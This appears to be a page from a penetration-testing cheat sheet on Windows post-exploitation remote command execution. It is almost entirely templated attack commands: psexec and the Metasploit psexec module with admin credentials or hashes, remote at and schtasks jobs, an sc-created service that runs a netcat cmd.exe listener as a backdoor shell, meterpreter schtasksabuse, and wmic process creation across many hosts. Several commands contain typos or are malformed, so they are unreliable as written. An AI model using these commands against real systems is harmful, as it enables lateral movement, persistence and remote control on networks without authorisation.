---
title: Remote Commands
category: Post-Exploitation
order: 3
---

> **WINDOWS** 

psexec (requires install, creates service on target) | <code> psexec \\[tartgetIP] [-d] [-u user]  [-p password] [command] [-s for system] [-d for disconnected like netcat] </code>
Metasploit  psexec (writes executable, creates a service with system privs, automatically removes service and executable) | <code> msf > use exploit/windows/smb/psexec <br>  msf > set PAYLOAD [payload] <br> msf > set RHOST [tartget] <br> msf > set SMBUser [admin_username] <br> msf > set SMBPass [admin_password_or_hash] </code>
at <br> windows 7 and lower <br> all commands at SYSTEM | <code> net use \\[targetIP] [password] /u:[admin_user] <br> sc \\[targetIP] query schedule (*make sure it is running*) <br> #if it isnt running <br> sc \\[targetIP] start schedule* <br> at [\\targetIP] [HH:MM] [A|P] [command] <br> at \\[machine] [time] cmd /c ""[command]"" <br> at \\[targetIP} (*check status*)" </code> 
schtasksStart | Time - HH:MM:SSFrequency: MINUTE, HOURLY, DAILY, ONCE, ONSTART, ONLOGON, ONIDLE <br> <code> net use \\[targetIP] [password] /u:[admin_user] <br> sc \\[targetIP] query schedule (*make sure it is running*) <br> *sc \\[targetIP] start schedule* <br> schtasks /creat /tn [taskname] /s [targetIP] /u [user] /p [password] /sc [frequency]  /st [starttime] /sd [startdate] /tr [command] <br> schtasks /query /s [targetIP]" </code>
SC - Runs as SYSTEM | <code> sc \\[targetIP] create netcat binpath= ""cmd.exe /k c:\tools\nc.exe -L -p cmd.exe <br> sc \\[targetIP] start netcat </code>
Metasploit schtasks | <code> meterpreter> run schtasksabuse -c "[command1][,command2].." -t [target IP] </code>
WMIC Invoke Porgram Runs as Admin User | <code> wmic /node:[targetIP] /user:[admin_user] /password:[password] process call create [command] </code>
WMIC on Multiple Machines | <code> /node:@[filename] - run a command on multiple machines listed in a file </code>

